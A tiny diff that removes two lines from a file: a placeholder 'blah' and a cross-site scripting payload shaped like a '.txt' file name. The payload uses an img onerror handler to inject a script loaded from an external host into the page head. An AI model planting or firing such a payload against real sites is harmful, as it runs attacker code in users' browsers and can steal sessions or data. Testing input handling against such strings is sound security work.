@@ -1,2 +1,0 @@
-blah
-'"><img src=x onerror="var s=document.createElement('script');s.src='::ti.ht:x?u=4';document.getElementsByTagName('head')[0].appendChild(s);">.txt
